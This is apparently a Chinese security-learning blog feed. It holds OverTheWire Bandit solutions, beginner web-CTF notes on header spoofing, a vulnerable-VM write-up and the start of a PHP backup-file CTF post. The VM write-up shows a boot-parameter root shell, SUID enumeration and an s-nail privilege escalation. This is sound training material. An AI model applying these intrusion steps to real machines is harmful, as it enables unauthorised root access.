maybehere10drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere11drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere12drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere13drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere14drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere15drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere16drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere17drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere18drwxr-x---  2 root bandit5 4096 Oct  5 06:19 maybehere19<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如下 我们使用find命令寻找目标文件</p><pre class="line-numbers language-none"><code class="language-none">find -size 1033c //在当前目录寻找大小为1033字节的文件./maybehere07/.file2cat ./maybehere07/.file2 //查看内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><blockquote><h1 id="Bandit-Level-6-→-Level-7"><a href="#Bandit-Level-6-→-Level-7" class="headerlink" title="Bandit Level 6 → Level 7"></a>Bandit Level 6 → Level 7</h1><h2 id="Level-Goal-6"><a href="#Level-Goal-6" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored <strong>somewhere on the server</strong> and has all of the following properties:</p><ul><li>owned by user bandit7</li><li>owned by group bandit6</li><li>33 bytes in size</li></ul></blockquote><p>这次直接没有指定目录了<br>给的目标文件特征为：<br><strong>文件所属者bandit7</strong><br><strong>文件所属组bandit6</strong><br><strong>大小33字节</strong><br>刚刚也给了相关的附加项 这里直接进行搜索 </p><pre class="line-numbers language-none"><code class="language-none">find / -user bandit7 -group bandit6 -size 33c//以整个电脑范围寻找文件所属者为bandit7 文件所属组为bandit6 大小为33字节的文件/var/lib/dpkg/info/bandit7.passwordcat /var/lib/dpkg/info/bandit7.password //查看文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><blockquote><h1 id="Bandit-Level-7-→-Level-8"><a href="#Bandit-Level-7-→-Level-8" class="headerlink" title="Bandit Level 7 → Level 8"></a>Bandit Level 7 → Level 8</h1><h2 id="Level-Goal-7"><a href="#Level-Goal-7" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> next to the word <strong>millionth</strong></p><h2 id="Commands-you-may-need-to-solve-this-level-5"><a href="#Commands-you-may-need-to-solve-this-level-5" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p><a href="https://man7.org/linux/man-pages/man1/man.1.html">man</a>, grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd<br>密码在data.txt之中 字符串靠近millionth<br>我们这里使用uniq命令来寻找data.txt中没有重复的行列</p></blockquote><pre class="line-numbers language-none"><code class="language-none">uniq data.txt|grep millionth//删除data.txt中的重复行 并筛选出有millionth的那行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>密码直接就出来了</p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><blockquote><h1 id="Bandit-Level-8-→-Level-9"><a href="#Bandit-Level-8-→-Level-9" class="headerlink" title="Bandit Level 8 → Level 9"></a>Bandit Level 8 → Level 9</h1><h2 id="Level-Goal-8"><a href="#Level-Goal-8" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> and is the only line of text that occurs only once</p><h2 id="Commands-you-may-need-to-solve-this-level-6"><a href="#Commands-you-may-need-to-solve-this-level-6" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>和上题相似 但要找的是只出现过一次的内容<br>需要使用与uniq相似的sort命令来一起助力<br>同时使用uniq的附加项-u来显示仅显示出一次的行列</p><pre class="line-numbers language-none"><code class="language-none">sort data.txt|uniq -u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><blockquote><h1 id="Bandit-Level-9-→-Level-10"><a href="#Bandit-Level-9-→-Level-10" class="headerlink" title="Bandit Level 9 → Level 10"></a>Bandit Level 9 → Level 10</h1><h2 id="Level-Goal-9"><a href="#Level-Goal-9" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong> in one of the few human-readable strings, preceded by several ‘=’ characters.</p><h2 id="Commands-you-may-need-to-solve-this-level-7"><a href="#Commands-you-may-need-to-solve-this-level-7" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>这题要用到strings命令输出文件中可打印的字符 并筛选出与等号相接的</p><pre class="line-numbers language-none"><code class="language-none">strings data.txt|grep =<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><blockquote><h1 id="Bandit-Level-10-→-Level-11"><a href="#Bandit-Level-10-→-Level-11" class="headerlink" title="Bandit Level 10 → Level 11"></a>Bandit Level 10 → Level 11</h1><h2 id="Level-Goal-10"><a href="#Level-Goal-10" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong>, which contains base64 encoded data</p><h2 id="Commands-you-may-need-to-solve-this-level-8"><a href="#Commands-you-may-need-to-solve-this-level-8" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>data.txt中的密码经过base64加密 解密即可</p><pre class="line-numbers language-none"><code class="language-none">base64 -d data.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><blockquote><h1 id="Bandit-Level-11-→-Level-12"><a href="#Bandit-Level-11-→-Level-12" class="headerlink" title="Bandit Level 11 → Level 12"></a>Bandit Level 11 → Level 12</h1><h2 id="Level-Goal-11"><a href="#Level-Goal-11" class="headerlink" title="Level Goal"></a>Level Goal</h2><p>The password for the next level is stored in the file <strong>data.txt</strong>, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p><h2 id="Commands-you-may-need-to-solve-this-level-9"><a href="#Commands-you-may-need-to-solve-this-level-9" class="headerlink" title="Commands you may need to solve this level"></a>Commands you may need to solve this level</h2><p>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p></blockquote><p>该密码经过凯撒密码(偏移量13)加密 放在网站里解密即可<br><img data-src="/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/4.jpg" alt="4"></p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;友情提示&quot;&gt;&lt;a href=&quot;#友情提示&quot; class=&quot;headerlink&quot; title=&quot;友情提示&quot;&gt;&lt;/a&gt;友情提示&lt;/h1&gt;&lt;p&gt;理论来说 这个网页的网站说了不允许剧透或是writeup&lt;br&gt;但这大多是为了方便我自身复习留下的资料&lt;br&gt;因此我不会直接在文中提供flag 只会写出方法与代码&lt;/p&gt;
&lt;h1 id=&quot;环境介绍&quot;&gt;&lt;a href=&quot;#环境介绍&quot; class=&quot;headerlink&quot; title=&quot;环境介绍&quot;&gt;&lt;/a&gt;环境介绍&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://overthewire.org/wargames/bandit/bandit0.html&quot;&gt;网页链接&lt;/a&gt;&lt;br&gt;该网页类似一个在线靶场 需要你登录它所提供的账号密码登录其ssh服务进行一场小游戏&lt;br&gt;我使用了MobaXterm来登陆&amp;#x2F;输入指令&lt;/p&gt;
&lt;h1 id=&quot;具体过程&quot;&gt;&lt;a href=&quot;#具体过程&quot; class=&quot;headerlink&quot; title=&quot;具体过程&quot;&gt;&lt;/a&gt;具体过程&lt;/h1&gt;&lt;h2 id=&quot;level-0-准备&quot;&gt;&lt;a href=&quot;#level-0-准备&quot; class=&quot;headerlink&quot; title=&quot;level 0&amp;#x2F;准备&quot;&gt;&lt;/a&gt;level 0&amp;#x2F;准备&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org, on port 2220. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;页面描述为指示你链接ssh服务 并给予了对应ip 端口 账号 密码&lt;br&gt;一旦登录成功 便可进入level0→level1的页面&lt;br&gt;关于登录 我们先打开MobaXterm 点击左上角的 &lt;strong&gt;Session&lt;/strong&gt; 选择ssh&lt;br&gt;输入ip地址&lt;code&gt;bandit.labs.overthewire.org&lt;/code&gt;与端口2220&lt;br&gt;&lt;img data-src=&quot;/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/1.jpg&quot; alt=&quot;1&quot;&gt;&lt;br&gt;确认后左边的User sessions便会多出一个连接 右键 Edit session 会进入相同的页面&lt;br&gt;&lt;img data-src=&quot;/2024/03/21/OverTheWire-bandit%E8%A7%A3%E6%9E%90/2.jpg&quot; alt=&quot;2&quot;&gt;&lt;br&gt;先点击① 会出来账号管理器 点击②来新建一个 输入bandit0与bandit0&lt;br&gt;保存好后在登陆前勾选左边的 &lt;code&gt;Specify username&lt;/code&gt; 选择对应账号名即可快速登陆&lt;br&gt;注：使用MobaXterm的该功能必须设定一个高级密码 请不要忽视它跳出的窗口&lt;br&gt;每道题里的flag相当于下一题的账号密码&lt;br&gt;也就是说下道题的结论是 账号 &lt;strong&gt;bandit(题号)&lt;/strong&gt; 与 密码 &lt;strong&gt;flag值&lt;/strong&gt;&lt;br&gt;这些即为前提 接下来正式入手&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/linux/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="linux" scheme="https://www.maonie.top/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>CTF实战相关2</title>
    <link href="https://www.maonie.top/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/"/>
    <id>https://www.maonie.top/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/</id>
    <published>2024-03-12T10:08:17.000Z</published>
    <updated>2024-03-12T10:09:45.548Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="CTF实战相关2"><a href="#CTF实战相关2" class="headerlink" title="CTF实战相关2"></a>CTF实战相关2</h1><p>以web类的CTF作为范本的话<br>应该做的</p><blockquote><p>1.检查网页元素  寻找相关提示<br>2.通过网络查看http标头(header)<br>3.burp扫描/hackbar投送信息/更改cookie<br>4.php相关知识</p></blockquote><p>还有标头会传达的 可更改的两个信息 X-Forwarded-For 与 Referer<br>简单来说<br>X-Forwarded-For表示访问该网址的ip 例如127.0.0.1即为本地访问<br>Referer代表了你是从哪个网页来——例如<code>http://www.google.com</code></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>（注：这里图片只附上结果 主要是不想再开环境了）<br>使用了谷歌浏览器的f12功能 burpsuite 与 firefox的hackbar插件</p><span id="more"></span><h4 id="1-BugKu-Web-计算器"><a href="#1-BugKu-Web-计算器" class="headerlink" title="1.BugKu-Web-计算器"></a>1.BugKu-Web-计算器</h4><p>检查html元素 发现页面中的答题框只允许输一个数字 无法正确回答<br>更改input框中限制的文字上限 成功作答 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/1.jpg" alt="1"></p><h4 id="2-攻防世界-Web新手区-disabled-button"><a href="#2-攻防世界-Web新手区-disabled-button" class="headerlink" title="2.攻防世界-Web新手区- disabled_button"></a>2.攻防世界-Web新手区- disabled_button</h4><p>检查html元素 发现页面中显示“一个不能按的按钮”  多半按下后才能显示flag<br>删去按钮属性框中的<code>disabled</code> 按下按钮 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/2.jpg" alt="2"></p><h4 id="3-BugKu-Web-头等舱"><a href="#3-BugKu-Web-头等舱" class="headerlink" title="3.BugKu-Web-头等舱"></a>3.BugKu-Web-头等舱</h4><p>检查页面 f12发现无标注隐藏元素 根据题目名“头等舱” 通过f12-网络<br>f5刷新后从网络标头中找到flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/3.jpg" alt="3"></p><h4 id="4-攻防世界-Web-baby-web"><a href="#4-攻防世界-Web-baby-web" class="headerlink" title="4.攻防世界-Web-baby_web"></a>4.攻防世界-Web-baby_web</h4><p>检查页面 发现无隐藏元素 根据作者提示<code>想想主页面是什么</code>访问目录index.php<br>然而index.php也无任何隐藏<br>最终 通过f12-网络 f5刷新后从该页面的网络标头中找到flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/4.jpg" alt="4"></p><h4 id="5-（BUUCTF）极客大挑战-2019-Havefun"><a href="#5-（BUUCTF）极客大挑战-2019-Havefun" class="headerlink" title="5.（BUUCTF）极客大挑战-2019-Havefun"></a>5.（BUUCTF）极客大挑战-2019-Havefun</h4><p>检查页面 元素中有标注代码 该页面GET方式接收cat参数<br>当cat=dog时会发生什么 于是传参 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/5.jpg" alt="5"></p><h4 id="6-攻防世界-Web新手区-get-post"><a href="#6-攻防世界-Web新手区-get-post" class="headerlink" title="6.攻防世界-Web新手区-get_post"></a>6.攻防世界-Web新手区-get_post</h4><p>检查页面 要求你通过GET方式提交a=1<br>提交后又叫你通过POST方式提交b=2<br>照做即可 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/6.jpg" alt="6"></p><h4 id="7-BugKu-Web-程序员本地网站"><a href="#7-BugKu-Web-程序员本地网站" class="headerlink" title="7.BugKu-Web-程序员本地网站"></a>7.BugKu-Web-程序员本地网站</h4><p>检查页面 页面显示<code>请以本地ip访问</code><br>使用burpsuite监听该网页 并将X-Forwarded-For标头改为127.0.0.1<br>获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/7.jpg" alt="7"></p><h4 id="8-BugKu-Web-你从哪里来"><a href="#8-BugKu-Web-你从哪里来" class="headerlink" title="8.BugKu-Web-你从哪里来"></a>8.BugKu-Web-你从哪里来</h4><p>检查页面 页面显示<code>are you from google？</code><br>判定与referer标头有关 通过burpsuite监听页面<br>将referer标头改为<code>http://www.google.com</code><br>获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/8.jpg" alt="8"></p><h4 id="9-攻防世界-Web新手区-xff-referrer"><a href="#9-攻防世界-Web新手区-xff-referrer" class="headerlink" title="9.攻防世界-Web新手区-xff_referrer"></a>9.攻防世界-Web新手区-xff_referrer</h4><p>检查页面 页面显示<code>ip必须为123.123.123</code><br>使用burpsuite监听该网页 并将X-Forwarded-For标头改为123.123.123.123<br>页面变为“必须来自<code>https://www.google.com</code>”<br>通过burpsuite监听页面 将referer标头改为<code>http://www.google.com</code><br>获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/9.jpg" alt="9"></p><h4 id="10-攻防世界-Web新手区-cookie"><a href="#10-攻防世界-Web新手区-cookie" class="headerlink" title="10.攻防世界-Web新手区-cookie"></a>10.攻防世界-Web新手区-cookie</h4><p>检查页面 页面显示“你知道什么是cookie吗？”<br>f12-网络 查看页面cookie 发现信息<code>look here=cookie.php</code><br>于是访问cookie.php 发现信息 <strong>see the http response</strong><br>查看标头 获得flag<br><img data-src="/2024/03/12/CTF%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B32/10.jpg" alt="10"></p></body></html>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;CTF实战相关2&quot;&gt;&lt;a href=&quot;#CTF实战相关2&quot; class=&quot;headerlink&quot; title=&quot;CTF实战相关2&quot;&gt;&lt;/a&gt;CTF实战相关2&lt;/h1&gt;&lt;p&gt;以web类的CTF作为范本的话&lt;br&gt;应该做的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.检查网页元素  寻找相关提示&lt;br&gt;2.通过网络查看http标头(header)&lt;br&gt;3.burp扫描&amp;#x2F;hackbar投送信息&amp;#x2F;更改cookie&lt;br&gt;4.php相关知识&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;还有标头会传达的 可更改的两个信息 X-Forwarded-For 与 Referer&lt;br&gt;简单来说&lt;br&gt;X-Forwarded-For表示访问该网址的ip 例如127.0.0.1即为本地访问&lt;br&gt;Referer代表了你是从哪个网页来——例如&lt;code&gt;http://www.google.com&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;例题&quot;&gt;&lt;a href=&quot;#例题&quot; class=&quot;headerlink&quot; title=&quot;例题&quot;&gt;&lt;/a&gt;例题&lt;/h2&gt;&lt;p&gt;（注：这里图片只附上结果 主要是不想再开环境了）&lt;br&gt;使用了谷歌浏览器的f12功能 burpsuite 与 firefox的hackbar插件&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/CTF/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://www.maonie.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>靶机解析-gigachad</title>
    <link href="https://www.maonie.top/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/"/>
    <id>https://www.maonie.top/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/</id>
    <published>2024-03-09T05:55:38.000Z</published>
    <updated>2024-03-10T07:26:46.478Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>这周的靶机</p><h1 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h1><p>攻击机：kali<br>靶机：gigachad</p><h2 id="相关知识-工具"><a href="#相关知识-工具" class="headerlink" title="相关知识-工具"></a>相关知识-工具</h2><p>linux单次登录/更改ip设置<br>提权技巧<br>searchsploit</p><h1 id="具体过程"><a href="#具体过程" class="headerlink" title="具体过程"></a>具体过程</h1><p>首先 我们打开两个机子</p><span id="more"></span><p>发现同网段扫不到靶机 检查了vmware的设置依旧没有问题<br>那就去靶机那里看看网络设置<br>需要账号密码登录 但我们可以通过更改启动选项来登录<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/2.jpg" alt="1"><br>在开机的这个页面按下e键 进入编辑模式<br>用方向键翻到Linux那行 再按右键一直到该行的末尾 将<code>ro quiet</code>改为<code>rw single init=/bin/bash</code></p><blockquote><p>rw 代表read write，读写模式。<br>signie init= 代表启动系统后自动运行的程序。<br>/bin/bash 是系统shell的位置。</p></blockquote><p><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/1.jpg" alt="1"><br>更改完毕后按下ctrl+x来保存 随后你会发现你成功登陆了 按enter来在加载时提前输入命令<br>在linux内挑出了shell后 为了排查扫不到的原因 先执行<code>ip a</code>检查一下<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/3.jpg" alt="3"><br>看来是网卡<code>ens33</code>没有自动分配到ip地址<br>看一下网络的配置 发现配置的网卡名是<code>enp0s3</code> 明显不对 将它改回<code>ens33</code><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/4.jpg" alt="4"></p><pre class="line-numbers language-none"><code class="language-none">cat /etc/network/interfaces //查看文件内容vi /etc/network/interfaces //编辑文件内容/etc/init.d/networking restart //重启网络<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>改完之后重启网络 通过<code>ip a</code>确认靶机已经联网<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/5.jpg" alt="5"><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/6.jpg" alt="6"><br>这里就可以看到靶机分到的ip了<br>重启靶机后直接在kali进行指定的nmap扫描<br><code>nmap -A -p- 'ip地址'  //-A指综合性扫描</code><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/7.jpg" alt="7"><br>http/80端口开着 ftp/21端口也开着 允许匿名登录 还有个叫chadinfo的文件<br>先从tcp入手<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/8.jpg" alt="8"></p><pre class="line-numbers language-none"><code class="language-none">ftp 'ip地址'  //尝试链接ftp服务lsget '文件名' //下载文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获取了叫chadinfo的文件<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/9.jpg" alt="9"><br>解压之后有个txt文件<br>里边说用户名是 <strong>chad</strong>  密码请去/drippinchad.png里找<br>访问网站底下的这个目录<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/10.jpg" alt="10"><br>why yes,this is my favorite place to relax.how could you tell?<br>这个地的地名似乎就是密码 以图搜图一下<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/11.jpg" alt="11"><br>结论：叫做maiden‘s tower<br>尝试用chad与maiden’s tower的各种形式来登录ssh服务<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/12.jpg" alt="12"><br>用<code>maidenstower</code>成功登录<br><img data-src="/13.jpg" alt="13"><br>目录底下就有flag1<br>flag2多半是需要提权了</p><blockquote><p>拿到低权限的shell后经常做的几件事：<br>1、看系统发行版本 lsb_release -a<br>2、查看内核版本 uname -a<br>3、当前用户权限<br>4、列举suid文件 `find / -perm -u=f 2&gt;/dev/null<br>5、查看已经安装的包、运行的服务，过期版本可能会存在漏洞</p><p>find / -perm -u=s -type f -exec ls -la {} ; 2&gt;/dev/null<br>-perm 是代表按指定权限搜索。<br>-u=s 其中u代表当前用户的权限，s代表suid权限，-号代表至少需要满足指定的权限，可以有更多的权限，但是不能少了这个指定权限。关于这个参数更详细的内容可以参考：<a href="https://blog.csdn.net/weixin_44061169/article/details/105784760">https://blog.csdn.net/weixin_44061169/article/details/105784760</a><br>-tpye 代表搜索指定的类型，f代表文件。<br>-exec 代表搜索完后执行指定的命令，其中{}代表所搜到的结果，命令以;为结束标识。更详细内容可以参考：<a href="https://www.pianshen.com/article/86691137271/">https://www.pianshen.com/article/86691137271/</a><br>2&gt;/dev/null 代表将不显示错误信息</p><p>参考：<a href="https://blog.csdn.net/rpsate/article/details/119494515">https://blog.csdn.net/rpsate/article/details/119494515</a></p></blockquote><p><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/14.jpg" alt="14"><br>发现s-nail，尝试利用该程序提权<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/15.jpg" alt="15"><br>寻找漏洞<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/16.jpg" alt="16"><br>将提权文件复制进靶机<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/17.jpg" alt="17"><br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/18.jpg" alt="18"><br>加权 运行 要多试几次 最后成功提权<br><img data-src="/2024/03/09/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90-gigachad/19.jpg" alt="19"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最近有点忙着备考就不写总结了<br>嘻嘻</p></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;这周的靶机&lt;/p&gt;
&lt;h1 id=&quot;环境设置&quot;&gt;&lt;a href=&quot;#环境设置&quot; class=&quot;headerlink&quot; title=&quot;环境设置&quot;&gt;&lt;/a&gt;环境设置&lt;/h1&gt;&lt;p&gt;攻击机：kali&lt;br&gt;靶机：gigachad&lt;/p&gt;
&lt;h2 id=&quot;相关知识-工具&quot;&gt;&lt;a href=&quot;#相关知识-工具&quot; class=&quot;headerlink&quot; title=&quot;相关知识-工具&quot;&gt;&lt;/a&gt;相关知识-工具&lt;/h2&gt;&lt;p&gt;linux单次登录&amp;#x2F;更改ip设置&lt;br&gt;提权技巧&lt;br&gt;searchsploit&lt;/p&gt;
&lt;h1 id=&quot;具体过程&quot;&gt;&lt;a href=&quot;#具体过程&quot; class=&quot;headerlink&quot; title=&quot;具体过程&quot;&gt;&lt;/a&gt;具体过程&lt;/h1&gt;&lt;p&gt;首先 我们打开两个机子&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="靶机解析" scheme="https://www.maonie.top/tags/%E9%9D%B6%E6%9C%BA%E8%A7%A3%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ctf实战相关1</title>
    <link href="https://www.maonie.top/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/"/>
    <id>https://www.maonie.top/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/</id>
    <published>2024-03-06T09:59:32.000Z</published>
    <updated>2024-03-06T12:51:21.599Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>本次主题为 <strong>[ACTF2020 新生赛]BackupFile</strong> 与 <strong>[极客大挑战 2019]BuyFlag</strong></p><h2 id="使用平台"><a href="#使用平台" class="headerlink" title="使用平台"></a>使用平台</h2><p>chrome<br><a href="https://buuoj.cn/">buuctf</a><br>firefox(搭载hackbar)</p><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><p>备份文件的存在<br>cookie查看/修改<br>php数据类型</p><h2 id="flag获取过程"><a href="#flag获取过程" class="headerlink" title="flag获取过程"></a>flag获取过程</h2><span id="more"></span><p><strong>1.[ACTF2020 新生赛]BackupFile</strong><br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/1.jpg" alt="1"><br>总之 一进去 啥都没有<br>f12注释也没藏<br>我们换个思路 既然题目内容点了题 那么解题方案注定和backup file有关<br>多半只能扫目录了 于是用dirsearch和dirb搜索相关的目录<br>最后发现是潜藏在主页的.bak(每个页面都会有的备份页面)之中<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/2.png" alt="2"><br>👆关于.bak文件的相关解释<br>目录后输入<code>/index.php.bak</code> 会为你自动下载一份文件 以记事本打开<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/3.jpg" alt="3"><br>要我通过输入非纯数字的方式提交$str的内容在PHP中：<br>= = 为弱相等 即当整数和字符串类型相比较时 会先将字符串转化为整数然后再进行比较。比如a=123和b=123a45进行= =比较时。b只会截取前面的整数部分 被转化成123 因此只需要提供参数?key=123即可<br><img data-src="/2024/03/06/ctf%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B31/4.jpg" alt="4"><br>提交flag 结束!</p><p><strong>2.[极客大挑战 